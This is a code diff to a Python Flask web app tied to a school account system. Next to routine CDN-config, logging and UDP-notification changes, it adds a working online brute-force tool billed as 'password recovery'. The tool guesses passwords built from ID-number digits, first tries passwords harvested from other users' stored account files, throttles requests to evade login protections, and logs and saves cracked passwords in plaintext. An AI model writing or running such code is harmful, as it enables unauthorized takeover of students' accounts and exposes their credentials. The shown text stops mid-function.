@@ -947,6 +947,11 @@ def _get_default_config():
         "noise_level": "0.08",
     }
 
+    config["CDN"] = {
+        "cdn_enabled": "true",
+        "cache_time": "3600",
+    }
+
     config["Features"] = {
         "enable_phone_modification": "false",
         "enable_phone_login": "false",
@@ -1121,6 +1126,26 @@ def _write_config_with_comments(config_obj, filepath):
         f.write(f"ip_api_key = {config_obj.get('API', 'ip_api_key', fallback='')}\n")
         f.write(
             "# 注意：验证码已改用本地生成器（见[Captcha]节），不再需要第三方API密钥\n\n"
+        )
+
+        # ========================================
+        # [CDN] CDN缓存配置
+        # ========================================
+        f.write("# ========================================\n")
+        f.write("# [CDN] CDN缓存配置\n")
+        f.write("# ========================================\n")
+        f.write("[CDN]\n")
+        f.write("# 是否启用CDN缓存（true/false）\n")
+        f.write("# true：启用CDN缓存，提高静态资源加载速度\n")
+        f.write("# false：禁用CDN缓存，所有资源直接从服务器获取\n")
+        f.write(
+            f"cdn_enabled = {config_obj.get('CDN', 'cdn_enabled', fallback='false')}\n"
+        )
+        f.write("# CDN缓存时间（秒）\n")
+        f.write("# 设置静态资源在CDN上的缓存有效期\n")
+        f.write("# 建议值：3600（1小时）、21600（6小时）、86400（24小时）\n")
+        f.write(
+            f"cache_time = {config_obj.get('CDN', 'cache_time', fallback='3600')}\n\n"
         )
 
         # ========================================
@@ -4343,8 +4368,48 @@ class Api:
             k: v for k, v in self.user_data.__dict__.items() if not k.startswith("_")
         }
 
-    def get_initial_data(self):
-        """应用启动时由前端调用，获取初始用户列表和最后登录用户"""
+    def get_initial_data(self, frontend_logs=None):
+        """
+        应用启动时由前端调用，获取初始用户列表和最后登录用户
+        
+        参数:
+            frontend_logs: 可选，前端发送的日志数据（列表或单个日志对象）
+        """
+
+        # ========== 处理前端日志（如果提供）==========
+        if frontend_logs:
+            try:
+                # 获取会话信息用于日志记录
+                session_id = getattr(self, "_web_session_id", "UnknownSession")
+                auth_username = getattr(self, "auth_username", None)
+                is_guest = getattr(self, "is_guest", False)
+                
+                # 确定用户名
+                username = "Guest" if is_guest else (auth_username or "Unknown")
+                
+                # 处理日志列表
+                logs_to_process = frontend_logs if isinstance(frontend_logs, list) else [frontend_logs]
+                
+                for log_item in logs_to_process:
+                    if isinstance(log_item, dict) and log_item.get("message"):
+                        level = log_item.get("level", "INFO").upper()
+                        message = log_item.get("message", "")
+                        timestamp = log_item.get("timestamp", "")
+                        source = log_item.get("source", "unknown")
+                        
+                        log_message = f"[前端日志][前端时间:{timestamp}][用户:{username}][Session:{session_id}][{source}] {message}"
+                        
+                        # 根据日志级别记录到后端
+                        if level == "ERROR":
+                            logging.error(log_message)
+                        elif level == "WARN" or level == "WARNING":
+                            logging.warning(log_message)
+                        else:
+                            logging.info(log_message)
+                            
+                logging.debug(f"[前端日志] 处理了 {len(logs_to_process)} 条前端日志")
+            except Exception as e:
+                logging.error(f"[前端日志] 处理前端日志时出错: {e}", exc_info=True)
 
         try:
             session_id = getattr(self, "_web_session_id", None)
@@ -4502,6 +4567,28 @@ class Api:
                 "is_multi_account_mode": getattr(self, "is_multi_account_mode", False),
                 "captcha_settings": captcha_settings,
             }
+
+            # [新增] 如果是超级管理员，在初始化数据中包含密码恢复任务列表
+            if auth_group == 'super_admin':
+                global brute_force_manager
+                if brute_force_manager:
+                    response_data["bruteforce_task_list"] = brute_force_manager.get_all_tasks_status()
+                else:
+                    response_data["bruteforce_task_list"] = []
+            
+            # [新增] 如果在多账号模式，添加所有账号的状态信息
+            if getattr(self, "is_multi_account_mode", False):
+                try:
+                    # 调用multi_get_all_accounts_status获取所有账号状态
+                    multi_status = self.multi_get_all_accounts_status()
+                    # 将账号状态数据添加到响应中
+                    if multi_status and isinstance(multi_status, dict):
+                        # 添加accounts字段
+                        response_data["accounts"] = multi_status.get("accounts", [])
+                        logging.debug(f"[多账号模式] 已添加 {len(response_data.get('accounts', []))} 个账号的状态信息")
+                except Exception as e:
+                    logging.error(f"[多账号模式] 获取账号状态失败: {e}", exc_info=True)
+                    response_data["accounts"] = []
 
             if is_logged_in and hasattr(self, "device_ua"):
                 response_data["device_ua"] = self.device_ua
@@ -12537,6 +12624,505 @@ def save_ssl_config(ssl_config):
         return False
 
 
+
+
+# ============================================================================
+# 密码恢复（暴力破解）功能的后端实现
+# 警告：此功能仅用于合法的学校账号密码恢复
+# 需要超级管理员权限，所有操作都会被详细记录
+# ============================================================================
+
+# 全局变量：存储密码恢复任务管理器
+brute_force_manager = None
+
+
+class BruteForceTaskManager:
+    """
+    密码恢复任务管理器
+    
+    功能：
+    - 管理多个账号的密码恢复任务
+    - 每个任务独立运行在后台线程中
+    - 支持启动、停止、查询任务状态
+    - 自动保存任务状态和恢复结果
+    """
+    
+    # 类常量：账号不存在的错误关键词
+    ACCOUNT_NOT_EXIST_KEYWORDS = ["不存在", "未找到", "无效", "not found", "invalid"]
+    
+    # 类常量：尝试密码间隔时间（秒）
+    PASSWORD_ATTEMPT_DELAY = 0.5
+
+    def __init__(self, logs_dir):
+        """
+        初始化任务管理器
+        
+        参数：
+            logs_dir (str): 日志目录路径，用于存储任务数据文件
+        """
+        # 存储所有任务的字典，键为账号，值为任务信息
+        self.tasks = {}
+        
+        # 线程锁：用于保护tasks字典的并发访问
+        self.lock = threading.Lock()
+        
+        # 日志目录路径
+        self.logs_dir = logs_dir
+        
+        # 已尝试密码的文件路径
+        self.attempts_file = os.path.join(logs_dir, "brute_force_attempts.json")
+        
+        # 破解结果的文件路径
+        self.results_file = os.path.join(logs_dir, "brute_force_results.json")
+        
+        # 确保日志目录存在
+        if not os.path.exists(logs_dir):
+            os.makedirs(logs_dir)
+        
+        # 加载已存在的尝试记录和结果
+        self.attempts = self._load_json_file(self.attempts_file, {})
+        self.results = self._load_json_file(self.results_file, {})
+
+        # [修正] 任务列表持久化文件路径
+        self.tasks_file = os.path.join(logs_dir, "brute_force_tasks.json")
+        
+        # [修正] 加载任务列表，并处理重启后的僵尸状态
+        self.tasks = self._load_json_file(self.tasks_file, {})
+        for acc, task_info in self.tasks.items():
+            # 如果重启前是运行状态，重启后线程已死，需重置为已停止
+            if task_info.get("status") == "running":
+                task_info["status"] = "stopped"
+        # 保存修正后的状态
+        if self.tasks:
+            self._save_json_file(self.tasks_file, self.tasks)
+        
+        logging.info("[密码恢复] 任务管理器初始化完成")
+
+    def _load_json_file(self, filepath, default=None):
+        """
+        从JSON文件加载数据
+        
+        参数：
+            filepath (str): 文件路径
+            default: 如果文件不存在或加载失败时返回的默认值
+        
+        返回值：
+            加载的数据或默认值
+        """
+        try:
+            # 检查文件是否存在
+            if os.path.exists(filepath):
+                # 读取并解析JSON文件
+                with open(filepath, "r", encoding="utf-8") as f:
+                    return json.load(f)
+        except Exception as e:
+            # 加载失败时记录错误
+            logging.error(f"[密码恢复] 加载文件失败 {filepath}: {e}")
+        
+        # 返回默认值
+        return default if default is not None else {}
+
+    def _save_json_file(self, filepath, data):
+        """
+        将数据保存到JSON文件
+        
+        参数：
+            filepath (str): 文件路径
+            data: 要保存的数据（必须可JSON序列化）
+        """
+        try:
+            # 将数据写入文件，使用UTF-8编码
+            with open(filepath, "w", encoding="utf-8") as f:
+                json.dump(data, f, indent=2, ensure_ascii=False)
+        except Exception as e:
+            # 保存失败时记录错误
+            logging.error(f"[密码恢复] 保存文件失败 {filepath}: {e}")
+
+    def generate_passwords(self, account):
+        """
+        密码生成器：根据身份证后六位规则生成密码
+        
+        参数：
+            account (str): 账号
+        
+        生成策略：
+        根据中国身份证号码后六位规则生成：
+        - 第1-2位: 出生日期的日(01-31)
+        - 第3-4位: 顺序码(00-99)，由当地派出所按顺序分配
+        - 第5位: 性别码(0-9)，偶数为女性，奇数为男性
+        - 第6位: 校验码(0-9, X, x)，X可能是大写或小写
+        
+        总共可能的密码组合：31 * 100 * 10 * 12 = 372,000个
+        跳过已经尝试过的密码
+        
+        返回值：
+            生成器，每次yield一个密码字符串
+        """
+        # 获取该账号已尝试过的密码集合
+        attempted = set(self.attempts.get(account, []))
+        
+        # 第6位校验码的可能值：0-9和X（大写和小写）
+        # 使用列表推导式生成0-9，然后添加X和x
+        check_codes = [str(i) for i in range(10)] + ['X', 'x']
+        
+        # 遍历所有可能的组合
+        for day in range(1, 32):  # 第1-2位：日期01-31
+            for seq in range(100):  # 第3-4位：顺序码00-99
+                for gender in range(10):  # 第5位：性别码0-9
+                    for check in check_codes:  # 第6位：校验码0-9,X,x
+                        # 组合成6位密码：日期(2位) + 顺序码(2位) + 性别(1位) + 校验(1位)
+                        password = f"{day:02d}{seq:02d}{gender}{check}"
+                        
+                        # 如果该密码未被尝试过，则yield返回
+                        if password not in attempted:
+                            yield password
+
+    def _find_local_passwords(self, target_account):
+        """
+        从本地配置文件中查找该账号可能存在的密码
+        """
+        found_pwds = set()
+        
+        # 1. 扫描 user_accounts 目录 (JSON格式: 系统用户 -> 学校账号映射)
+        # 使用 AuthSystem 的方法读取，避免重复造轮子
+        ua_dir = os.path.join(SCHOOL_ACCOUNTS_DIR, "user_accounts")
+        if os.path.exists(ua_dir) and 'auth_system' in globals():
+            try:
+                for fname in os.listdir(ua_dir):
+                    if fname.endswith(".json"):
+                        auth_username = os.path.splitext(fname)[0]
+                        # 使用已有的 auth_system 方法加载账户信息，更健壮
+                        accounts = auth_system._load_user_school_accounts(auth_username)
+                        
+                        if accounts and target_account in accounts:
+                            val = accounts[target_account]
+                            pwd = ""
+                            if isinstance(val, dict):
+                                pwd = val.get("password", "")
+                            elif isinstance(val, str):
+                                pwd = val
+            except Exception as e:
+                logging.warning(f"[密码恢复] 扫描user_accounts失败: {e}")
+
+        # 2. 扫描 school_accounts 根目录 (INI格式: 旧版单文件配置)
+        # 路径: school_accounts/{target_account}.ini
+        ini_path = os.path.join(SCHOOL_ACCOUNTS_DIR, f"{target_account}.ini")
+        if os.path.exists(ini_path):
+            try:
+                # 简单文本解析以避免 ConfigParser 的复杂性
+                with open(ini_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    for line in f:
+                        line = line.strip()
+                        # 匹配 Password = xxx 或 密码 = xxx
+                        if line.lower().startswith("password") or line.startswith("密码"):
+                            parts = line.split("=", 1)
+                            if len(parts) == 2:
+                                pwd = parts[1].strip()
+                                if pwd:
+                                    found_pwds.add(pwd)
+                                    break
+            except Exception as e:
+                logging.warning(f"[密码恢复] 读取INI失败: {e}")
+
+        if(len(found_pwds) > 0):
+            logging.info(f"[密码恢复] 在本地配置文件中为账号 {target_account} 发现可能的密码: {found_pwds}")
+
+        return list(found_pwds)
+
+
+    def start_task(self, account):
+        """
+        启动账号的密码恢复任务
+        
+        参数：
+            account (str): 要恢复密码的账号
+        
+        返回值：
+            dict: {"success": True/False, "message": "..."}
+        """
+        # 使用线程锁保护并发访问
+        with self.lock:
+            # 检查该账号是否已有任务在运行
+            if account in self.tasks and self.tasks[account].get("status") == "running":
+                return {"success": False, "message": f"账号 {account} 的任务已在运行中"}
+            
+            # 创建新任务的状态信息
+            task_info = {
+                "account": account,  # 账号
+                "status": "running",  # 状态：running
+                "attempts": 0,  # 已尝试密码数
+                "password": None,  # 找到的密码（初始为None）
+                "start_time": datetime.datetime.now().isoformat(),  # 开始时间
+                "end_time": None,  # 结束时间（初始为None）
+                "stop_flag": False,  # 停止标志（用于通知线程停止）
+            }
+            
+            # 将任务添加到tasks字典
+            self.tasks[account] = task_info
+
+            # [修正] 持久化任务列表
+            self._save_json_file(self.tasks_file, self.tasks)
+            
+            # 如果该账号没有尝试记录，创建空列表
+            if account not in self.attempts:
+                self.attempts[account] = []
+        
+        # 创建后台线程执行密码破解
+        thread = threading.Thread(
+            target=self._run_brute_force,
+            args=(account,),
+            daemon=True,  # 守护线程，主程序退出时自动终止
+        )
+        thread.start()
+        
+        # 记录任务启动日志
+        logging.info(f"[密码恢复] 已启动账号 {account} 的密码恢复任务")
+        
+        return {"success": True, "message": f"已启动账号 {account} 的任务"}
+
+    def _run_brute_force(self, account):
+        """
+        执行密码破解的后台线程函数
+        
+        参数：
+            account (str): 账号
+        
+        执行流程：
+        1. 创建临时ApiClient用于登录验证
+        2. 遍历密码生成器生成的密码
+        3. 对每个密码尝试登录（使用学校登录API）
+        4. 如果登录成功，记录密码并停止
+        5. 如果账号不存在（返回特定错误），停止任务
+        6. 如果收到停止信号，停止任务
+        """
+        try:
+            # 创建临时的Api实例用于登录测试
+            # 注意：为了避免影响现有会话，创建独立的Api对象
+            # 注意：不需要临时目录，ApiClient不依赖文件系统
+            
+            # 创建一个简单的临时对象来模拟Api需要的属性
+            class TempApp:
+                def __init__(self):
+                    self.device_ua = ApiClient.generate_random_ua()
+                    self.log = lambda msg: logging.debug(f"[密码恢复临时登录] {msg}")
+                    # [修复] 补充缺失属性，防止 ApiClient._request 报错
+                    self.is_offline_mode = False 
+                    self.api_bridge = None # ApiClient 会先检查 is_offline_mode，有了上面这行通常不需要 api_bridge，但为了保险起见设为 None 或 self
+            
+            temp_app = TempApp()
+            api_client = ApiClient(temp_app)
+            
+            # 记录开始尝试
+            logging.info(f"[密码恢复] 开始尝试账号 {account} 的密码恢复")
+            
+            # === 修改开始：优先尝试本地密码 ===
+            # 1. 获取本地已知密码
+            local_passwords = self._find_local_passwords(account)
+            if local_passwords:
+                logging.info(f"[密码恢复] 在本地配置文件中找到 {len(local_passwords)} 个历史密码，将优先尝试")
+
+            # 2. 获取算法生成器
+            algo_gen = self.generate_passwords(account)
+
+            # 3. 构建组合生成器
+            def combined_password_generator():
+                # 先尝试本地发现的密码
+                for p in local_passwords:
+                    yield p
+                # 再尝试算法生成的密码
+                for p in algo_gen:
+                    yield p
+
+            password_gen = combined_password_generator()
+            # === 修改结束 ===
+            
+            # 遍历每个密码
+            for password in password_gen:
+                # 检查是否收到停止信号
+                with self.lock:
+                    if self.tasks[account].get("stop_flag"):
+                        logging.info(f"[密码恢复] 账号 {account} 的任务收到停止信号")
+                        self.tasks[account]["status"] = "stopped"
+                        self.tasks[account]["end_time"] = datetime.datetime.now().isoformat()
+                        self._save_json_file(self.results_file, self.results)
+                        # [修正] 持久化任务状态更新
+                        self._save_json_file(self.tasks_file, self.tasks)
+                        return
+                
+                # 尝试使用该密码登录学校系统
+                # 使用ApiClient.login方法进行登录验证
+                try:
+                    resp = api_client.login(account, password)
+                    
+                    # 检查登录是否成功
+                    if resp and resp.get("success"):
+                        # 登录成功！找到密码
+                        success = True
+                        logging.info(f"[密码恢复] 账号 {account} 登录成功，密码为: {password}")
+                    else:
+                        # 登录失败
+                        success = False
+                        error_msg = resp.get("message", "") if resp else ""
+                        
+                        # 检查是否是"账号不存在"的错误
+                        # 使用类常量中定义的关键词列表
+                        if any(keyword in error_msg for keyword in self.ACCOUNT_NOT_EXIST_KEYWORDS):
+                            logging.warning(f"[密码恢复] 账号 {account} 不存在，停止任务")
+                            with self.lock:
+                                self.tasks[account]["status"] = "failed"
+                                self.tasks[account]["end_time"] = datetime.datetime.now().isoformat()
+                                # [修正] 持久化任务状态更新
+                                self._save_json_file(self.tasks_file, self.tasks)
+
+                                self.results[account] = {
+                                    "status": "failed",
+                                    "password": None,
+                                    "attempts": self.tasks[account]["attempts"],
+                                    "start_time": self.tasks[account]["start_time"],
+                                    "end_time": self.tasks[account]["end_time"],
+                                    "error": "账号不存在"
+                                }
+                                self._save_json_file(self.results_file, self.results)
+                            return
+                
+                except Exception as e:
+                    # 登录请求异常，继续尝试下一个密码
+                    logging.debug(f"[密码恢复] 账号 {account} 尝试密码 {password} 时出现异常: {e}")
+                    success = False
+                
+                # 更新已尝试密码数
+                with self.lock:
+                    self.tasks[account]["attempts"] += 1
+                    self.attempts[account].append(password)
+                    
+                    # 每尝试100个密码保存一次
+                    if self.tasks[account]["attempts"] % 100 == 0:
+                        self._save_json_file(self.attempts_file, self.attempts)
+                        logging.info(f"[密码恢复] 账号 {account} 已尝试 {self.tasks[account]['attempts']} 个密码")
+                
+                # 如果登录成功
+                if success:
+                    with self.lock:
+                        # 更新任务状态
+                        self.tasks[account]["status"] = "success"
+                        self.tasks[account]["password"] = password
+                        self.tasks[account]["end_time"] = datetime.datetime.now().isoformat()
+                        
+                        # [修正] 持久化任务状态更新
+                        self._save_json_file(self.tasks_file, self.tasks)
+
+                        # 保存结果
+                        self.results[account] = {
+                            "status": "success",
+                            "password": password,
+                            "attempts": self.tasks[account]["attempts"],
+                            "start_time": self.tasks[account]["start_time"],
+                            "end_time": self.tasks[account]["end_time"],
+                        }
+                        self._save_json_file(self.results_file, self.results)
+                    
+                    logging.info(f"[密码恢复] 账号 {account} 的密码已找到: {password}")
+                    return
+                
+                # 添加短暂延迟，避免请求过快触发防护
+                # 使用类常量定义的延迟时间
+                time.sleep(self.PASSWORD_ATTEMPT_DELAY)
+            
+            # 所有密码都尝试完毕，未找到
+            with self.lock:
+                self.tasks[account]["status"] = "failed"
+                self.tasks[account]["end_time"] = datetime.datetime.now().isoformat()
+                
+                # [修正] 持久化任务状态更新
+                self._save_json_file(self.tasks_file, self.tasks)
+
+                # 保存结果
+                self.results[account] = {
+                    "status": "failed",
+                    "password": None,
+                    "attempts": self.tasks[account]["attempts"],
+                    "start_time": self.tasks[account]["start_time"],
+                    "end_time": self.tasks[account]["end_time"],
+                }
+                self._save_json_file(self.results_file, self.results)
+            
+            logging.info(f"[密码恢复] 账号 {account} 的任务完成，未找到密码")
+        
+        except Exception as e:
+            # 捕获异常，记录错误并更新任务状态
+            logging.error(f"[密码恢复] 账号 {account} 的任务执行失败: {e}", exc_info=True)
+            with self.lock:
+                self.tasks[account]["status"] = "failed"
+                self.tasks[account]["end_time"] = datetime.datetime.now().isoformat()
+                # [修正] 持久化任务状态更新
+                self._save_json_file(self.tasks_file, self.tasks)
+
+    def stop_task(self, account):
+        """
+        停止指定账号的密码恢复任务
+        
+        参数：
+            account (str): 账号
+        
+        返回值：
+            dict: {"success": True/False, "message": "..."}
+        """
+        with self.lock:
+            # 检查任务是否存在
+            if account not in self.tasks:
+                return {"success": False, "message": f"账号 {account} 没有任务"}
+            
+            # 检查任务是否正在运行
+            if self.tasks[account].get("status") != "running":
+                return {"success": False, "message": f"账号 {account} 的任务不在运行中"}
+            
+            # 设置停止标志
+            self.tasks[account]["stop_flag"] = True
+        
+        logging.info(f"[密码恢复] 已发送停止信号给账号 {account} 的任务")
+        
+        return {"success": True, "message": f"已发送停止信号给账号 {account}"}
+
+    def stop_all_tasks(self):
+        """
+        停止所有正在运行的密码恢复任务
+        
+        返回值：
+            dict: {"success": True, "stopped_count": 整数}
+        """
+        stopped_count = 0
+        
+        with self.lock:
+            # 遍历所有任务
+            for account, task_info in self.tasks.items():
+                # 如果任务正在运行，设置停止标志
+                if task_info.get("status") == "running":
+                    task_info["stop_flag"] = True
+                    stopped_count += 1
+        
+        logging.info(f"[密码恢复] 已发送停止信号给 {stopped_count} 个任务")
+        
+        return {"success": True, "stopped_count": stopped_count}
+
+    def get_all_tasks_status(self):
+        """
+        获取所有任务的状态
+        
+        返回值：
+            list: 任务状态列表，每个元素是一个任务信息字典
+        """
+        with self.lock:
+            # 创建任务列表的副本，避免返回内部数据
+            tasks_list = []
+            for account, task_info in self.tasks.items():
+                # 复制任务信息，移除stop_flag（内部使用）
+                task_copy = task_info.copy()
+                task_copy.pop("stop_flag", None)
+                tasks_list.append(task_copy)
+            
+            return tasks_list
+
+
 def validate_ssl_certificate(cert_path, key_path):
     """
     验证SSL证书文件和密钥文件是否有效。
@@ -12661,6 +13247,116 @@ def get_ssl_certificate_info(cert_path):
     return cert_info
 
 
+def _send_startup_notification_to_log_forwarder(host, port):
+    """
+    通过UDP向日志转发器发送Flask启动通知
+    
+    工作流程：
+    1. 等待Flask服务器真正就绪（通过HTTP健康检查）
+    2. 发送UDP启动通知到日志转发器
+    3. 等待日志转发器的UDP确认响应
+    4. 如果未收到确认，每5秒重试一次
+    5. 如果1分钟内未成功，记录错误并停止尝试
+    
+    参数：
+        host (str): Flask服务器地址
+        port (int): Flask服务器端口
+    """
+    import socket
+    import time
+    
+    # UDP配置
+    LOG_FORWARDER_UDP_PORT = 9999  # 日志转发器监听端口
+    MAIN_UDP_PORT = 9998  # main.py监听确认响应的端口
+    STARTUP_MESSAGE = "FLASK_STARTED"  # 启动通知消息
+    ACK_MESSAGE = "ACK_RECEIVED"  # 确认消息
+    MAX_WAIT_TIME = 60  # 最大等待时间（秒）
+    RETRY_INTERVAL = 5  # 重试间隔（秒）
+    
+    try:
+        # 第1步：等待Flask服务器就绪（通过HTTP健康检查）
+        logging.info("[UDP通知] 等待Flask服务器完全就绪...")
+        flask_ready = False
+        health_check_start = time.time()
+        
+        while time.time() - health_check_start < 30:  # 最多等待30秒
+            try:
+                import requests
+                response = requests.get(f"http://{host}:{port}/", timeout=1)
+                if response.status_code in [200, 404, 302]:  # 任何响应都表示服务器已启动
+                    flask_ready = True
+                    logging.info("[UDP通知] Flask服务器已就绪")
+                    break
+            except:
+                time.sleep(0.5)  # 等待0.5秒后重试
+        
+        if not flask_ready:
+            logging.warning("[UDP通知] Flask服务器健康检查超时，仍然尝试发送UDP通知")
+        
+        # 第2步：创建UDP socket用于发送通知和接收确认
+        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        udp_socket.bind(('127.0.0.1', MAIN_UDP_PORT))  # 绑定本地端口接收确认
+        udp_socket.settimeout(RETRY_INTERVAL)  # 设置接收超时为重试间隔
+        
+        logging.info(f"[UDP通知] 已创建UDP socket，监听端口 {MAIN_UDP_PORT}")
+        
+        # 第3步：循环发送启动通知并等待确认
+        start_time = time.time()
+        attempt_count = 0
+        confirmed = False
+        
+        while time.time() - start_time < MAX_WAIT_TIME:
+            attempt_count += 1
+            
+            try:
+                # 发送启动通知
+                udp_socket.sendto(
+                    STARTUP_MESSAGE.encode('utf-8'),
+                    ('127.0.0.1', LOG_FORWARDER_UDP_PORT)
+                )
+                logging.info(f"[UDP通知] 第{attempt_count}次尝试：已发送启动通知到日志转发器（端口{LOG_FORWARDER_UDP_PORT}）")
+                
+                # 等待确认响应
+                try:
+                    data, addr = udp_socket.recvfrom(1024)
+                    message = data.decode('utf-8')
+                    
+                    if message == ACK_MESSAGE:
+                        logging.info(f"[UDP通知] ✓ 收到日志转发器的确认响应（来自 {addr}）")
+                        logging.info("[UDP通知] 日志转发握手成功完成")
+                        confirmed = True
+                        break
+                    else:
+                        logging.warning(f"[UDP通知] 收到未知消息: {message}")
+                
+                except socket.timeout:
+                    elapsed = int(time.time() - start_time)
+                    logging.warning(
+                        f"[UDP通知] 等待确认超时（已尝试{attempt_count}次，已用时{elapsed}秒），"
+                        f"将在{RETRY_INTERVAL}秒后重试..."
+                    )
+                    # 超时后会在下一次循环重试
+            
+            except Exception as e:
+                logging.error(f"[UDP通知] 发送通知时出错: {e}")
+                time.sleep(RETRY_INTERVAL)
+        
+        # 第4步：检查是否成功
+        if not confirmed:
+            logging.error(
+                f"[UDP通知] ✗ 在{MAX_WAIT_TIME}秒内未收到日志转发器的确认响应"
+            )
+            logging.error("[UDP通知] 日志转发系统可能未正常启动")
+            logging.error("[UDP通知] 注意：这可能导致nginx日志未能转发到Python日志系统")
+        
+        # 第5步：关闭UDP socket
+        udp_socket.close()
+        logging.info("[UDP通知] UDP通知线程结束")
+        
+    except Exception as e:
+        logging.error(f"[UDP通知] UDP通知线程发生异常: {e}", exc_info=True)
+
+
 def start_web_server(args_param):
     """
     启动Flask Web服务器主函数，集成SocketIO实时通信和Chrome浏览器自动化。
@@ -12694,6 +13390,11 @@ def start_web_server(args_param):
     try:
         background_task_manager = BackgroundTaskManager()
         logging.info("后台任务管理器初始化成功")
+        
+        # 初始化密码恢复任务管理器
+        global brute_force_manager
+        brute_force_manager = BruteForceTaskManager(LOGIN_LOGS_DIR)
+        logging.info("密码恢复任务管理器初始化成功")
 
         logging.info("程序启动：正在清理所有历史后台任务记录（内存和文件）...")
         cleaned_files_count = 0
@@ -17341,6 +18042,86 @@ def start_web_server(args_param):
             )
             return jsonify({"success": False, "message": str(e)}), 500
 
+    @app.route("/api/log_nginx", methods=["POST"])
+    def log_nginx():
+        """
+        接收nginx访问日志并记录到Python日志系统
+        
+        接受的数据格式：
+        {
+            "remote_addr": "客户端IP",
+            "remote_user": "认证用户",
+            "time_local": "本地时间",
+            "request": "请求行",
+            "status": "响应状态码",
+            "body_bytes_sent": "发送字节数",
+            "http_referer": "来源页面",
+            "http_user_agent": "用户代理",
+            "http_x_forwarded_for": "代理IP"
+        }
+        或批量模式：
+        {
+            "batch": [日志对象数组]
+        }
+        """
+        try:
+            req_data = request.get_json() or {}
+            
+            # 定义单条nginx日志处理函数
+            def process_nginx_log(log_entry):
+                # 提取nginx日志字段
+                remote_addr = log_entry.get("remote_addr", "-")
+                remote_user = log_entry.get("remote_user", "-")
+                time_local = log_entry.get("time_local", "")
+                request_line = log_entry.get("request", "-")
+                status = log_entry.get("status", "-")
+                body_bytes = log_entry.get("body_bytes_sent", "-")
+                referer = log_entry.get("http_referer", "-")
+                user_agent = log_entry.get("http_user_agent", "-")
+                forwarded_for = log_entry.get("http_x_forwarded_for", "-")
+                
+                # 格式化日志消息（类似nginx access.log格式）
+                log_message = (
+                    f"[Nginx访问日志] {remote_addr} - {remote_user} [{time_local}] "
+                    f'"{request_line}" {status} {body_bytes} '
+                    f'"{referer}" "{user_agent}" "{forwarded_for}"'
+                )
+                
+                # 根据HTTP状态码决定日志级别
+                try:
+                    status_code = int(status)
+                    if status_code >= 500:
+                        # 5xx 服务器错误 -> ERROR
+                        logging.error(log_message)
+                    elif status_code >= 400:
+                        # 4xx 客户端错误 -> WARNING
+                        logging.warning(log_message)
+                    else:
+                        # 2xx, 3xx 正常 -> INFO
+                        logging.info(log_message)
+                except (ValueError, TypeError):
+                    # 状态码无效时使用INFO级别
+                    logging.info(log_message)
+            
+            # 判断是批量模式还是单条模式
+            if "batch" in req_data and isinstance(req_data["batch"], list):
+                # 批量处理
+                for log_entry in req_data["batch"]:
+                    if isinstance(log_entry, dict):
+                        process_nginx_log(log_entry)
+            else:
+                # 单条处理
+                process_nginx_log(req_data)
+            
+            return jsonify({"success": True})
+            
+        except Exception as e:
+            logging.error(
+                f"[Nginx日志处理错误] 处理失败: {e}",
+                exc_info=True,
+            )
+            return jsonify({"success": False, "message": str(e)}), 500
+
     @app.route("/api/auth/check_phone", methods=["POST"])
     def auth_check_phone():
         """
@@ -18321,6 +19102,348 @@ def start_web_server(args_param):
         except Exception as e:
             logging.error(f"[SSL管理] 切换SSL状态失败: {e}", exc_info=True)
             return jsonify({"success": False, "message": f"操作失败: {str(e)}"}), 500
+
+    # ============================================================================
+    # CDN缓存配置管理API
+    # 这个部分提供CDN缓存设置的API接口
+    # ============================================================================
+
+    @app.route("/api/admin/cdn/config", methods=["GET"])
+    @login_required
+    def get_cdn_config():
+        """
+        获取CDN缓存配置
+        
+        功能说明：
+        - 从config.ini文件读取CDN配置
+        - 返回CDN启用状态和缓存时间
+        - 需要管理员权限（manage_system）
+        
+        返回格式：
+        {
+            "success": true,
+            "config": {
+                "cdn_enabled": false,
+                "cache_time": 3600
+            }
+        }
+        """
+        try:
+            # 检查用户是否有系统管理权限
+            # manage_system权限允许用户修改系统配置
+            if not auth_system.check_permission(g.user, "manage_system"):
+                # 权限不足，返回403 Forbidden状态码
+                return jsonify({"success": False, "message": "权限不足"}), 403
+            
+            # 创建ConfigParser对象读取配置文件
+            config = configparser.ConfigParser()
+            
+            # 检查配置文件是否存在
+            if not os.path.exists(CONFIG_FILE):
+                # 配置文件不存在，返回默认配置
+                logging.warning(f"[CDN配置] 配置文件 {CONFIG_FILE} 不存在，使用默认配置")
+                return jsonify({
+                    "success": True,
+                    "config": {
+                        "cdn_enabled": False,
+                        "cache_time": 3600
+                    }
+                })
+            
+            # 读取配置文件
+            config.read(CONFIG_FILE, encoding="utf-8")
+            
+            # 读取CDN配置，如果不存在则使用默认值
+            cdn_enabled = config.getboolean("CDN", "cdn_enabled", fallback=False)
+            cache_time = config.getint("CDN", "cache_time", fallback=3600)
+            
+            # 组装配置数据
+            cdn_config = {
+                "cdn_enabled": cdn_enabled,
+                "cache_time": cache_time
+            }
+            
+            # 记录配置加载日志，包括用户名
+            logging.info(f"[CDN配置] {g.user} 查询CDN配置: {cdn_config}")
+            
+            # 返回成功响应，包含配置数据
+            return jsonify({
+                "success": True,
+                "config": cdn_config
+            })
+
+        except Exception as e:
+            # 捕获所有异常，记录错误日志
+            logging.error(f"[CDN配置] 获取配置失败: {e}", exc_info=True)
+            # 返回500 Internal Server Error状态码
+            return jsonify({"success": False, "message": f"获取配置失败: {str(e)}"}), 500
+
+    @app.route("/api/admin/cdn/config", methods=["POST"])
+    @login_required
+    def update_cdn_config():
+        """
+        更新CDN缓存配置
+        
+        功能说明：
+        - 接收前端提交的CDN配置数据
+        - 验证数据的有效性
+        - 保存配置到config.ini文件（使用_write_config_with_comments保留注释）
+        - 需要管理员权限（manage_system）
+        
+        请求格式：
+        {
+            "cdn_enabled": true,
+            "cache_time": 3600
+        }
+        
+        返回格式：
+        {
+            "success": true,
+            "message": "配置已保存",
+            "config": {
+                "cdn_enabled": true,
+                "cache_time": 3600
+            }
+        }
+        """
+        try:
+            # 检查用户权限
+            if not auth_system.check_permission(g.user, "manage_system"):
+                return jsonify({"success": False, "message": "权限不足"}), 403
+            
+            # 获取请求体中的JSON数据
+            data = request.get_json()
+            
+            # 验证请求数据是否存在
+            if not data:
+                # 请求数据为空，返回400 Bad Request状态码
+                return jsonify({"success": False, "message": "请求数据为空"}), 400
+            
+            # 创建ConfigParser对象读取现有配置
+            config = configparser.ConfigParser()
+            
+            # 检查配置文件是否存在
+            if os.path.exists(CONFIG_FILE):
+                # 配置文件存在，读取现有配置
